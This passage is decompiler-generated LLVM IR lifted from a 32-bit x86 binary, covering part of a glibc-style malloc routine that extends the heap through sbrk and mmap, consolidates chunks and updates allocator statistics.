  %v3_80504aa = inttoptr i32 %v2_80504aa to i32*
  store i32 %v0_80504aa, i32* %v3_80504aa, align 4
  %v0_80504ad = load i32, i32* %eax.global-to-local, align 4
  %v1_80504ad = add i32 %v0_80504ad, 8
  %v2_80504ad = inttoptr i32 %v1_80504ad to i32*
  store i32 ptrtoint (i32* @global_var_805e814.181 to i32), i32* %v2_80504ad, align 4
  %v0_80504b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80504b4 = add i32 %v0_80504b4, 12
  %v2_80504b4 = inttoptr i32 %v1_80504b4 to i32*
  store i32 ptrtoint (i32* @global_var_805e814.181 to i32), i32* %v2_80504b4, align 4
  %v0_80504bb = load i32, i32* @global_var_805e810.180, align 16
  %v4_80504c1 = load i32, i32* %eax.global-to-local, align 4
  %v5_80504c1 = select i1 %v8_8050227, i32 %v4_80504c1, i32 %v0_80504bb
  %v4_80504c4 = or i32 %v1_805057e, 1
  store i32 %v5_80504c1, i32* @global_var_805e810.180, align 16
  %v0_80504cf = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_80504c4, i32* %ebx.global-to-local, align 4
  %v1_80504d5 = or i32 %v0_80504cf, 1
  store i32 %v1_80504d5, i32* @edx, align 4
  %v3_80504d8 = add i32 %v0_80504cf, %v4_80504c1
  %v4_80504d8 = inttoptr i32 %v3_80504d8 to i32*
  store i32 %v0_80504cf, i32* %v4_80504d8, align 4
  %v0_80504db = load i32, i32* %ebx.global-to-local, align 4
  %v1_80504db = load i32, i32* @ecx, align 4
  %v2_80504db = add i32 %v1_80504db, 4
  %v3_80504db = inttoptr i32 %v2_80504db to i32*
  store i32 %v0_80504db, i32* %v3_80504db, align 4
  %v0_80504de = load i32, i32* @edx, align 4
  %v1_80504de = load i32, i32* %eax.global-to-local, align 4
  %v2_80504de = add i32 %v1_80504de, 4
  %v3_80504de = inttoptr i32 %v2_80504de to i32*
  store i32 %v0_80504de, i32* %v3_80504de, align 4
  br label %dec_label_pc_80504e1

dec_label_pc_80504e1:                             ; preds = %dec_label_pc_80505d5, %dec_label_pc_8050493, %dec_label_pc_805049a
  %v0_80504e1 = load i32, i32* @ecx, align 4
  %v1_80504e1 = add i32 %v0_80504e1, 8
  store i32 %v1_80504e1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050909

dec_label_pc_80504e9.loopexit:                    ; preds = %dec_label_pc_805042e
  br label %dec_label_pc_80504e9

dec_label_pc_80504e9:                             ; preds = %dec_label_pc_80504e9.loopexit, %dec_label_pc_80501e9, %dec_label_pc_80501f1
  %v0_80504e9 = load i32, i32* @global_var_805e80c.179, align 4
  store i32 %v0_80504e9, i32* @ebx, align 4
  store i32 %v1_805057e, i32* %esi.global-to-local, align 4
  %v1_80504f3 = add i32 %v0_80504e9, 4
  %v2_80504f3 = inttoptr i32 %v1_80504f3 to i32*
  %v3_80504f3 = load i32, i32* %v2_80504f3, align 4
  %v1_80504f6 = add i32 %v1_805057e, 16
  store i32 %v1_80504f6, i32* @esi, align 4
  %v1_80504fd = and i32 %v3_80504f3, -4
  store i32 %v1_80504fd, i32* %ecx.global-to-local, align 4
  %v7_8050500 = icmp ult i32 %v1_80504fd, %v1_80504f6
  br i1 %v7_8050500, label %dec_label_pc_8050520, label %dec_label_pc_8050504

dec_label_pc_8050504:                             ; preds = %dec_label_pc_80504e9
  %v2_8050508 = add i32 %v0_80504e9, %v1_805057e
  store i32 %v2_8050508, i32* @edx, align 4
  %v1_805050b = or i32 %v1_805057e, 1
  store i32 %v1_805050b, i32* %eax.global-to-local, align 4
  store i32 %v2_8050508, i32* @global_var_805e80c.179, align 4
  store i32 %v1_805050b, i32* %v2_80504f3, align 4
  %v0_8050517 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8050517 = sub i32 %v0_8050517, %v1_805057e
  store i32 %v5_8050517, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050899

dec_label_pc_8050520:                             ; preds = %dec_label_pc_80504e9
  %v0_8050520 = load i8, i8* @global_var_805e7e0.178, align 32
  %v1_8050520 = and i8 %v0_8050520, 2
  %v2_8050520 = icmp eq i8 %v1_8050520, 0
  %v0_8050527 = load i32, i32* @global_var_805eb3c.184, align 4
  store i32 %v0_8050527, i32* %edx.global-to-local, align 4
  br i1 %v2_8050520, label %dec_label_pc_8050554, label %dec_label_pc_805052f

dec_label_pc_805052f:                             ; preds = %dec_label_pc_8050520
  store i32 ptrtoint (i8* @global_var_805e7e0.178 to i32), i32* %stack_var_-92, align 4
  %v2_8050537 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805e7e0.178 to i32*))
  store i32 ptrtoint (i8* @global_var_805e7e0.178 to i32), i32* @ebx, align 4
  %v1_8050541 = add i32 %v1_805057e, -7
  store i32 %v1_8050541, i32* %eax.global-to-local, align 4
  store i32 %v1_8050541, i32* %stack_var_-92, align 4
  %v1_8050545 = call i32 @malloc(i32 %v1_8050541)
  store i32 %v1_8050545, i32* %eax.global-to-local, align 4
  store i32 %v1_8050545, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050909

dec_label_pc_8050554:                             ; preds = %dec_label_pc_8050520
  store i32 %v1_805057e, i32* @ebx, align 4
  %v1_8050558 = add i32 %v0_8050527, -1
  store i32 %v1_8050558, i32* @ecx, align 4
  %v1_805055b = load i32, i32* @global_var_805eb2c.185, align 4
  %v7_805055b = icmp ult i32 %v1_805057e, %v1_805055b
  br i1 %v7_805055b, label %dec_label_pc_8050636, label %dec_label_pc_805056b

dec_label_pc_805056b:                             ; preds = %dec_label_pc_8050554
  %v0_805056b = load i32, i32* @global_var_805eb30.186, align 16
  store i32 %v0_805056b, i32* %eax.global-to-local, align 4
  %v1_8050570 = load i32, i32* @global_var_805eb34.187, align 4
  %v5_8050576 = icmp slt i32 %v0_805056b, %v1_8050570
  br i1 %v5_8050576, label %dec_label_pc_805057c, label %dec_label_pc_8050636

dec_label_pc_805057c:                             ; preds = %dec_label_pc_805056b
  %v2_805057e = add i32 %v1_805057e, 10
  %v3_805057e = add i32 %v2_805057e, %v0_8050527
  %v1_8050582 = sub i32 0, %v0_8050527
  store i32 %v1_8050582, i32* %eax.global-to-local, align 4
  %v2_8050584 = and i32 %v3_805057e, %v1_8050582
  store i32 %v2_8050584, i32* @ebx, align 4
  %tmp139 = icmp ugt i32 %v2_8050584, %v1_805057e
  br i1 %tmp139, label %dec_label_pc_8050590, label %dec_label_pc_8050636

dec_label_pc_8050590:                             ; preds = %dec_label_pc_805057c
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805059d = call i32 @mmap(i32 0, i32 %v2_8050584, i32 3, i32 34, i32 0, i32 0, i32 %v1_8050558, i32 %v1_8050558)
  store i32 %v8_805059d, i32* %eax.global-to-local, align 4
  %v10_80505a5 = icmp eq i32 %v8_805059d, -1
  store i32 %v8_805059d, i32* %edx.global-to-local, align 4
  br i1 %v10_80505a5, label %dec_label_pc_8050590.dec_label_pc_8050636_crit_edge, label %dec_label_pc_80505b0

dec_label_pc_8050590.dec_label_pc_8050636_crit_edge: ; preds = %dec_label_pc_8050590
  %v0_8050636.pre = load i32, i32* @global_var_805e80c.179, align 4
  br label %dec_label_pc_8050636

dec_label_pc_80505b0:                             ; preds = %dec_label_pc_8050590
  %v1_80505b2 = urem i32 %v8_805059d, 8
  %v2_80505b2 = icmp eq i32 %v1_80505b2, 0
  store i32 %v1_80505b2, i32* %ecx.global-to-local, align 4
  br i1 %v2_80505b2, label %dec_label_pc_80505cb, label %dec_label_pc_80505b7

dec_label_pc_80505b7:                             ; preds = %dec_label_pc_80505b0
  %v0_80505bc = load i32, i32* @ebx, align 4
  %v2_80505be = sub nsw i32 8, %v1_80505b2
  store i32 %v2_80505be, i32* %eax.global-to-local, align 4
  %v2_80505c0 = add i32 %v2_80505be, %v8_805059d
  store i32 %v2_80505c0, i32* @ecx, align 4
  %v2_80505c3 = sub i32 %v0_80505bc, %v2_80505be
  store i32 %v2_80505c3, i32* %esi.global-to-local, align 4
  %v2_80505c5 = inttoptr i32 %v2_80505c0 to i32*
  store i32 %v2_80505be, i32* %v2_80505c5, align 4
  br label %dec_label_pc_80505d5

dec_label_pc_80505cb:                             ; preds = %dec_label_pc_80505b0
  store i32 %v8_805059d, i32* @ecx, align 4
  %v1_80505cd = inttoptr i32 %v8_805059d to i32*
  store i32 0, i32* %v1_80505cd, align 4
  br label %dec_label_pc_80505d5

dec_label_pc_80505d5:                             ; preds = %dec_label_pc_80505b7, %dec_label_pc_80505cb
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_80505b7 ], [ @ebx, %dec_label_pc_80505cb ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_80505d5 = or i32 %storemerge, 2
  %v1_80505d8 = load i32, i32* @ecx, align 4
  %v2_80505d8 = add i32 %v1_80505d8, 4
  %v3_80505d8 = inttoptr i32 %v2_80505d8 to i32*
  store i32 %v1_80505d5, i32* %v3_80505d8, align 4
  %v0_80505db = load i32, i32* @global_var_805eb30.186, align 16
  %v0_80505e0 = load i32, i32* @global_var_805eb50.188, align 16
  %v1_80505e6 = add i32 %v0_80505db, 1
  %v1_80505e7 = load i32, i32* @global_var_805eb38.189, align 8
  %v2_80505e7 = sub i32 %v1_80505e6, %v1_80505e7
  %v8_80505e7 = xor i32 %v1_80505e7, %v1_80505e6
  %v9_80505e7 = xor i32 %v2_80505e7, %v1_80505e6
  %v10_80505e7 = and i32 %v9_80505e7, %v8_80505e7
  %v11_80505e7 = icmp slt i32 %v10_80505e7, 0
  %v12_80505e7 = icmp eq i32 %v2_80505e7, 0
  %v13_80505e7 = icmp slt i32 %v2_80505e7, 0
  store i32 %v1_80505e6, i32* @global_var_805eb30.186, align 16
  %v3_80505f2 = icmp ne i1 %v13_80505e7, %v11_80505e7
  %v4_80505f2 = or i1 %v12_80505e7, %v3_80505f2
  %v7_80505f2 = select i1 %v4_80505f2, i32 %v1_80505e7, i32 %v1_80505e6
  store i32 %v7_80505f2, i32* @global_var_805eb38.189, align 8
  %v0_80505fe = load i32, i32* @global_var_805eb44.190, align 4
  %v1_8050603 = load i32, i32* @ebx, align 4
  %v2_8050603 = add i32 %v1_8050603, %v0_80505fe
  store i32 %v2_8050603, i32* @global_var_805eb44.190, align 4
  %tmp86 = icmp ule i32 %v2_8050603, %v0_80505e0
  %v5_8050610 = select i1 %tmp86, i32 %v0_80505e0, i32 %v2_8050603
  store i32 %v5_8050610, i32* @edx, align 4
  %v1_8050613 = load i32, i32* @global_var_805eb48.191, align 8
  %v2_8050613 = add i32 %v1_8050613, %v2_8050603
  store i32 %v5_8050610, i32* @global_var_805eb50.188, align 16
  %v1_805061f = load i32, i32* @global_var_805eb54.192, align 4
  %tmp140 = icmp ule i32 %v2_8050613, %v1_805061f
  %v5_8050625 = select i1 %tmp140, i32 %v1_805061f, i32 %v2_8050613
  store i32 %v5_8050625, i32* %eax.global-to-local, align 4
  store i32 %v5_8050625, i32* @global_var_805eb54.192, align 4
  br label %dec_label_pc_80504e1

dec_label_pc_8050636:                             ; preds = %dec_label_pc_805057c, %dec_label_pc_8050590.dec_label_pc_8050636_crit_edge, %dec_label_pc_805056b, %dec_label_pc_8050554
  %v0_8050636 = phi i32 [ %v0_8050636.pre, %dec_label_pc_8050590.dec_label_pc_8050636_crit_edge ], [ %v0_80504e9, %dec_label_pc_805056b ], [ %v0_80504e9, %dec_label_pc_805057c ], [ %v0_80504e9, %dec_label_pc_8050554 ]
  store i32 %v0_8050636, i32* %eax.global-to-local, align 4
  %v1_805063f = add i32 %v0_8050636, 4
  %v2_805063f = inttoptr i32 %v1_805063f to i32*
  %v3_805063f = load i32, i32* %v2_805063f, align 4
  %v1_8050646 = and i32 %v3_805063f, -4
  %v2_8050646 = icmp eq i32 %v1_8050646, 0
  store i32 %v1_8050646, i32* @ebp, align 4
  %v1_805064c = load i32, i32* @global_var_805eb28.193, align 8
  %v0_8050656 = load i8, i8* @global_var_805eb40.194, align 64
  %v1_8050656 = urem i8 %v0_8050656, 2
  %v2_8050656 = icmp eq i8 %v1_8050656, 0
  %v1_805065d = icmp eq i1 %v2_8050656, false
  %v1_8050646.op = sub i32 0, %v1_8050646
  %v2_8050654.neg = select i1 %v1_805065d, i32 %v1_8050646.op, i32 0
  %v2_805064c = add i32 %v1_8050558, %v1_80504f6
  %v4_805065d = add i32 %v2_805064c, %v1_805064c
  %v5_8050664 = add i32 %v4_805065d, %v2_8050654.neg
  store i32 %v5_8050664, i32* %eax.global-to-local, align 4
  %v1_8050668 = sub i32 0, %v0_8050527
  store i32 %v1_8050668, i32* @edx, align 4
  %v2_805066c = and i32 %v5_8050664, %v1_8050668
  store i32 %v2_805066c, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_805066c, 1
  br i1 %tmp87, label %dec_label_pc_805068a, label %dec_label_pc_8050674

dec_label_pc_8050674:                             ; preds = %dec_label_pc_8050636
  store i32 %v2_805066c, i32* %stack_var_-92, align 4
  %v1_8050678 = call i32 @__GI_sbrk(i32 %v2_805066c)
  store i32 %v1_8050678, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_8050683 = icmp eq i32 %v1_8050678, -1
  store i32 %v1_8050678, i32* @ebx, align 4
  %v1_8050688 = icmp eq i1 %v10_8050683, false
  br i1 %v1_8050688, label %dec_label_pc_80506e1, label %dec_label_pc_8050674.dec_label_pc_805068a_crit_edge

dec_label_pc_8050674.dec_label_pc_805068a_crit_edge: ; preds = %dec_label_pc_8050674
  %v0_805068a.pre = load i8, i8* @global_var_805eb40.194, align 64
  br label %dec_label_pc_805068a

dec_label_pc_805068a:                             ; preds = %dec_label_pc_8050674.dec_label_pc_805068a_crit_edge, %dec_label_pc_8050636
  %v0_80506b7 = phi i32 [ -1, %dec_label_pc_8050674.dec_label_pc_805068a_crit_edge ], [ %v1_8050668, %dec_label_pc_8050636 ]
  %v0_805068a = phi i8 [ %v0_805068a.pre, %dec_label_pc_8050674.dec_label_pc_805068a_crit_edge ], [ %v0_8050656, %dec_label_pc_8050636 ]
  %v1_805068a = urem i8 %v0_805068a, 2
  %v2_805068a = icmp eq i8 %v1_805068a, 0
  br i1 %v2_805068a, label %dec_label_pc_805068a.dec_label_pc_805069f_crit_edge, label %dec_label_pc_8050693

dec_label_pc_805068a.dec_label_pc_805069f_crit_edge: ; preds = %dec_label_pc_805068a
  %v0_805069f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805069f

dec_label_pc_8050693:                             ; preds = %dec_label_pc_805068a
  %v2_8050697 = add i32 %v1_8050646, %v1_8050558
  store i32 %v2_8050697, i32* %eax.global-to-local, align 4
  %v0_8050699 = load i32, i32* @esi, align 4
  %v2_8050699 = add i32 %v0_8050699, %v2_8050697
  %v5_805069b = and i32 %v2_8050699, %v1_8050668
  store i32 %v5_805069b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805069f

dec_label_pc_805069f:                             ; preds = %dec_label_pc_805068a.dec_label_pc_805069f_crit_edge, %dec_label_pc_8050693
  %v3_80506aa = phi i32 [ %v0_805069f.pre, %dec_label_pc_805068a.dec_label_pc_805069f_crit_edge ], [ %v5_805069b, %dec_label_pc_8050693 ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_80506aa, 1048576
  %v5_80506aa = select i1 %tmp88, i32 1048576, i32 %v3_80506aa
  store i32 %v5_80506aa, i32* @esi, align 4
  %tmp141 = icmp ugt i32 %v5_80506aa, %v1_805057e
  br i1 %tmp141, label %dec_label_pc_80506b7, label %dec_label_pc_80508fc

dec_label_pc_80506b7:                             ; preds = %dec_label_pc_805069f
  store i32 0, i32* %stack_var_-92, align 4
  %v8_80506c4 = call i32 @mmap(i32 0, i32 %v5_80506aa, i32 3, i32 34, i32 0, i32 0, i32 %v0_80506b7, i32 %v0_80506b7)
  store i32 %v8_80506c4, i32* %eax.global-to-local, align 4
  %v10_80506cc = icmp eq i32 %v8_80506c4, -1
  store i32 %v8_80506c4, i32* @ebx, align 4
  br i1 %v10_80506cc, label %dec_label_pc_80508fc, label %dec_label_pc_80506d7

dec_label_pc_80506d7:                             ; preds = %dec_label_pc_80506b7
  %v0_80506d7 = load i8, i8* @global_var_805eb40.194, align 1
  %v2_80506d7 = and i8 %v0_80506d7, -2
  store i8 %v2_80506d7, i8* @global_var_805eb40.194, align 64
  %v1_80506de = load i32, i32* @esi, align 4
  %v2_80506de = add i32 %v1_80506de, %v8_80506c4
  store i32 %v2_80506de, i32* @edx, align 4
  br label %dec_label_pc_80506e1

dec_label_pc_80506e1:                             ; preds = %dec_label_pc_8050674, %dec_label_pc_80506d7
  %v0_80507a8 = phi i32 [ -1, %dec_label_pc_8050674 ], [ %v2_80506de, %dec_label_pc_80506d7 ]
  %v0_80507b6 = phi i32 [ %v1_8050678, %dec_label_pc_8050674 ], [ %v8_80506c4, %dec_label_pc_80506d7 ]
  %v10_80506e1 = icmp eq i32 %v0_80507b6, -1
  br i1 %v10_80506e1, label %dec_label_pc_80508fc, label %dec_label_pc_80506ea

dec_label_pc_80506ea:                             ; preds = %dec_label_pc_80506e1
  %v0_80506ee = load i32, i32* @global_var_805eb48.191, align 8
  %v1_80506ee = load i32, i32* @esi, align 4
  %v2_80506ee = add i32 %v1_80506ee, %v0_80506ee
  store i32 %v2_80506ee, i32* @global_var_805eb48.191, align 8
  %v2_80506f4 = add i32 %v1_8050646, %v0_8050636
  store i32 %v2_80506f4, i32* %ecx.global-to-local, align 4
  %v2_80506f6 = sub i32 %v0_80507b6, %v2_80506f4
  %v7_80506f6 = icmp ult i32 %v0_80507b6, %v2_80506f4
  %v12_80506f6 = icmp eq i32 %v2_80506f6, 0
  %v1_80506f8 = icmp eq i1 %v12_80506f6, false
  br i1 %v1_80506f8, label %dec_label_pc_8050711, label %dec_label_pc_80506fa

dec_label_pc_80506fa:                             ; preds = %dec_label_pc_80506ea
  %v10_80506fa = icmp eq i32 %v0_80507a8, -1
  %v1_80506fd = icmp eq i1 %v10_80506fa, false
  br i1 %v1_80506fd, label %dec_label_pc_8050711, label %dec_label_pc_80506ff

dec_label_pc_80506ff:                             ; preds = %dec_label_pc_80506fa
  store i32 %v0_8050636, i32* %ecx.global-to-local, align 4
  %v2_8050703 = add i32 %v1_80506ee, %v1_8050646
  %v1_8050706 = or i32 %v2_8050703, 1
  store i32 %v1_8050706, i32* %eax.global-to-local, align 4
  store i32 %v1_8050706, i32* %v2_805063f, align 4
  br label %dec_label_pc_805083e

dec_label_pc_8050711:                             ; preds = %dec_label_pc_80506fa, %dec_label_pc_80506ea
  %v0_8050711 = load i8, i8* @global_var_805eb40.194, align 1
  %v1_8050711 = sext i8 %v0_8050711 to i32
  store i32 %v1_8050711, i32* %eax.global-to-local, align 4
  %v2_8050716 = urem i8 %v0_8050711, 2
  %v3_8050716 = icmp eq i8 %v2_8050716, 0
  br i1 %v3_8050716, label %dec_label_pc_805072a, label %dec_label_pc_805071a

dec_label_pc_805071a:                             ; preds = %dec_label_pc_8050711
  br i1 %v2_8050646, label %dec_label_pc_805072a, label %dec_label_pc_805071e

dec_label_pc_805071e:                             ; preds = %dec_label_pc_805071a
  %v1_8050720 = icmp eq i1 %v7_80506f6, false
  br i1 %v1_8050720, label %dec_label_pc_805072a, label %dec_label_pc_8050722

dec_label_pc_8050722:                             ; preds = %dec_label_pc_805071e
  %v1_8050722 = and i32 %v1_8050711, -2
  %v4_8050722 = trunc i32 %v1_8050722 to i8
  store i32 %v1_8050722, i32* %eax.global-to-local, align 4
  store i8 %v4_8050722, i8* @global_var_805eb40.194, align 64
  br label %dec_label_pc_805072a

dec_label_pc_805072a:                             ; preds = %dec_label_pc_805071e, %dec_label_pc_805071a, %dec_label_pc_8050711, %dec_label_pc_8050722
  %v0_805072a = phi i8 [ %v0_8050711, %dec_label_pc_805071e ], [ %v0_8050711, %dec_label_pc_805071a ], [ %v0_8050711, %dec_label_pc_8050711 ], [ %v4_8050722, %dec_label_pc_8050722 ]
  %v1_805072a = urem i8 %v0_805072a, 2
  %v2_805072a = icmp eq i8 %v1_805072a, 0
  br i1 %v2_805072a, label %dec_label_pc_80507a8, label %dec_label_pc_8050733

dec_label_pc_8050733:                             ; preds = %dec_label_pc_805072a
  br i1 %v2_8050646, label %dec_label_pc_8050741, label %dec_label_pc_8050737

dec_label_pc_8050737:                             ; preds = %dec_label_pc_8050733
  store i32 %v2_80506f6, i32* %eax.global-to-local, align 4
  %v2_805073b = add i32 %v2_80506ee, %v2_80506f6
  store i32 %v2_805073b, i32* @global_var_805eb48.191, align 8
  br label %dec_label_pc_8050741

dec_label_pc_8050741:                             ; preds = %dec_label_pc_8050733, %dec_label_pc_8050737
  %v1_8050743 = urem i32 %v0_80507b6, 8
  %v2_8050743 = icmp eq i32 %v1_8050743, 0
  store i32 %v1_8050743, i32* %edx.global-to-local, align 4
  %v1_8050746 = icmp eq i1 %v2_8050743, false
  br i1 %v1_8050746, label %dec_label_pc_805074e, label %dec_label_pc_8050748

dec_label_pc_8050748:                             ; preds = %dec_label_pc_8050741
  store i32 %v0_80507b6, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050758

dec_label_pc_805074e:                             ; preds = %dec_label_pc_8050741
  %v2_8050753 = sub nsw i32 8, %v1_8050743
  store i32 %v2_8050753, i32* %eax.global-to-local, align 4
  %v2_8050755 = add i32 %v2_8050753, %v0_80507b6
  store i32 %v2_8050755, i32* @edi, align 4
  br label %dec_label_pc_8050758

dec_label_pc_8050758:                             ; preds = %dec_label_pc_8050748, %dec_label_pc_805074e
  %v0_8050765 = phi i32 [ 0, %dec_label_pc_8050748 ], [ %v2_8050753, %dec_label_pc_805074e ]
  %v2_8050758 = add i32 %v1_80506ee, %v0_80507b6
  %v2_8050765 = add i32 %v0_8050765, %v1_8050646
  store i32 %v2_8050765, i32* %ecx.global-to-local, align 4
  %v2_8050768 = add i32 %v2_8050765, %v2_8050758
  store i32 %v2_8050768, i32* %edx.global-to-local, align 4
  %v2_805076a = add i32 %v2_8050768, %v1_8050558
  %v5_805076d = and i32 %v2_805076a, %v1_8050668
  %v2_8050774 = sub i32 %v5_805076d, %v2_8050768
  store i32 %v2_8050774, i32* %eax.global-to-local, align 4
  %v2_8050776 = add i32 %v2_8050774, %v2_8050765
  store i32 %v2_8050776, i32* @esi, align 4
  store i32 %v2_8050776, i32* %stack_var_-92, align 4
  %v1_805077a = call i32 @__GI_sbrk(i32 %v2_8050776)
  store i32 %v1_805077a, i32* %eax.global-to-local, align 4
  %v10_8050782 = icmp eq i32 %v1_805077a, -1
  store i32 %v1_805077a, i32* %edx.global-to-local, align 4
  %v1_8050787 = icmp eq i1 %v10_8050782, false
  br i1 %v1_8050787, label %dec_label_pc_8050797, label %dec_label_pc_8050789

dec_label_pc_8050789:                             ; preds = %dec_label_pc_8050758
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805078e = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805078e, i32* %eax.global-to-local, align 4
  store i32 %v1_805078e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80507cb

dec_label_pc_8050797:                             ; preds = %dec_label_pc_8050758
  %v1_8050797 = load i32, i32* @ebx, align 4
  %v7_8050797 = icmp ult i32 %v1_805077a, %v1_8050797
  %v1_8050799 = icmp eq i1 %v7_8050797, false
  br i1 %v1_8050799, label %dec_label_pc_80507d0, label %dec_label_pc_805079b

dec_label_pc_805079b:                             ; preds = %dec_label_pc_8050797
  %v0_805079b = load i8, i8* @global_var_805eb40.194, align 1
  %v2_805079b = and i8 %v0_805079b, -2
  store i8 %v2_805079b, i8* @global_var_805eb40.194, align 64
  store i32 %v2_8050758, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80507af

dec_label_pc_80507a8:                             ; preds = %dec_label_pc_805072a
  %v10_80507a8 = icmp eq i32 %v0_80507a8, -1
  br i1 %v10_80507a8, label %dec_label_pc_80507b3, label %dec_label_pc_80507ad

dec_label_pc_80507ad:                             ; preds = %dec_label_pc_80507a8
  store i32 %v0_80507b6, i32* @edi, align 4
  br label %dec_label_pc_80507af

dec_label_pc_80507af:                             ; preds = %dec_label_pc_805079b, %dec_label_pc_80507ad
  %v0_80507d047 = phi i32 [ %v2_8050758, %dec_label_pc_805079b ], [ %v0_80507a8, %dec_label_pc_80507ad ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80507d0

dec_label_pc_80507b3:                             ; preds = %dec_label_pc_80507a8
  store i32 %v0_80507b6, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80507ba = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80507ba, i32* %edx.global-to-local, align 4
  %v1_80507c1 = load i32, i32* @ebx, align 4
  %v2_80507c1 = sub i32 %v1_80507ba, %v1_80507c1
  %v1_80507c3 = load i32, i32* @esi, align 4
  %v2_80507c3 = sub i32 %v2_80507c1, %v1_80507c3
  store i32 %v2_80507c3, i32* %eax.global-to-local, align 4
  %v0_80507c5 = load i32, i32* @global_var_805eb48.191, align 8
  %v2_80507c5 = add i32 %v0_80507c5, %v2_80507c3
  store i32 %v2_80507c5, i32* @global_var_805eb48.191, align 8
  br label %dec_label_pc_80507cb

dec_label_pc_80507cb:                             ; preds = %dec_label_pc_8050789, %dec_label_pc_80507b3
  %v0_80507d046 = phi i32 [ %v1_805078e, %dec_label_pc_8050789 ], [ %v1_80507ba, %dec_label_pc_80507b3 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80507d0

dec_label_pc_80507d0:                             ; preds = %dec_label_pc_8050797, %dec_label_pc_80507af, %dec_label_pc_80507cb
  %v0_80507d5 = phi i32 [ %v1_805077a, %dec_label_pc_8050797 ], [ %v0_80507d047, %dec_label_pc_80507af ], [ %v0_80507d046, %dec_label_pc_80507cb ]
  %v10_80507d0 = icmp eq i32 %v0_80507d5, -1
  br i1 %v10_80507d0, label %dec_label_pc_805083e, label %dec_label_pc_80507d5

dec_label_pc_80507d5:                             ; preds = %dec_label_pc_80507d0
  %v1_80507d5 = load i32, i32* @edi, align 4
  %v2_80507d5 = sub i32 %v0_80507d5, %v1_80507d5
  store i32 %v2_80507d5, i32* %edx.global-to-local, align 4
  %v1_80507d7 = load i32, i32* @esi, align 4
  %v2_80507d7 = add i32 %v1_80507d7, %v2_80507d5
  %v1_80507da = or i32 %v2_80507d7, 1
  store i32 %v1_80507da, i32* %eax.global-to-local, align 4
  store i32 %v1_80507d5, i32* @global_var_805e80c.179, align 4
  %v2_80507e3 = add i32 %v1_80507d5, 4
  %v3_80507e3 = inttoptr i32 %v2_80507e3 to i32*
  store i32 %v1_80507da, i32* %v3_80507e3, align 4
  %v0_80507e6 = load i32, i32* @global_var_805eb48.191, align 8
  %v1_80507e6 = load i32, i32* @esi, align 4
  %v2_80507e6 = add i32 %v1_80507e6, %v0_80507e6
  store i32 %v2_80507e6, i32* @global_var_805eb48.191, align 8
  br i1 %v2_8050646, label %dec_label_pc_805083e, label %dec_label_pc_80507f0

dec_label_pc_80507f0:                             ; preds = %dec_label_pc_80507d5
  store i32 %v0_8050636, i32* %ecx.global-to-local, align 4
  %v1_80507f4 = add i32 %v1_8050646, -12
  %v1_80507f7 = and i32 %v1_80507f4, -8
  store i32 %v1_80507f7, i32* %eax.global-to-local, align 4
  %v1_80507fc = or i32 %v1_80507f7, 1
  store i32 %v1_80507fc, i32* %edx.global-to-local, align 4
  %v5_80507ff = icmp ult i32 %v1_80507f7, 15
  store i32 %v1_80507fc, i32* %v2_805063f, align 4
  %v0_8050805 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050805 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050805 = add i32 %v0_8050805, 4
  %v3_8050805 = add i32 %v2_8050805, %v1_8050805
  %v4_8050805 = inttoptr i32 %v3_8050805 to i32*
  store i32 5, i32* %v4_8050805, align 4
  %v0_805080d = load i32, i32* %ecx.global-to-local, align 4
  %v1_805080d = load i32, i32* %eax.global-to-local, align 4
  %v2_805080d = add i32 %v0_805080d, 8
  %v3_805080d = add i32 %v2_805080d, %v1_805080d
  %v4_805080d = inttoptr i32 %v3_805080d to i32*
  store i32 5, i32* %v4_805080d, align 4
  br i1 %v5_80507ff, label %dec_label_pc_805083e, label %dec_label_pc_8050817

dec_label_pc_8050817:                             ; preds = %dec_label_pc_80507f0
  %v0_8050817 = load i32, i32* @global_var_805eb24.195, align 4
  store i32 %v0_8050817, i32* @ebx, align 4
  %v0_805081d = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050822 = add i32 %v0_805081d, 8
  store i32 %v1_8050822, i32* %eax.global-to-local, align 4
  store i32 %v1_8050822, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_805eb24.195, align 4
  %v1_8050830 = call i32 @free(i32 %v1_8050822)
  store i32 %v1_8050830, i32* %eax.global-to-local, align 4
  %v0_8050838 = load i32, i32* @ebx, align 4
  store i32 %v0_8050838, i32* @global_var_805eb24.195, align 4
  br label %dec_label_pc_805083e

dec_label_pc_805083e:                             ; preds = %dec_label_pc_80507f0, %dec_label_pc_80507d5, %dec_label_pc_80507d0, %dec_label_pc_80506ff, %dec_label_pc_8050817
  %v0_805083e = load i32, i32* @global_var_805eb48.191, align 8
  %v0_8050843 = load i32, i32* @global_var_805eb4c.196, align 4
  %v0_805084f = load i32, i32* @global_var_805e80c.179, align 4
  store i32 %v0_805084f, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_805083e, %v0_8050843
  %v5_8050855 = select i1 %tmp89, i32 %v0_8050843, i32 %v0_805083e
  store i32 %v5_8050855, i32* @edx, align 4
  %v1_8050858 = load i32, i32* @global_var_805eb44.190, align 4
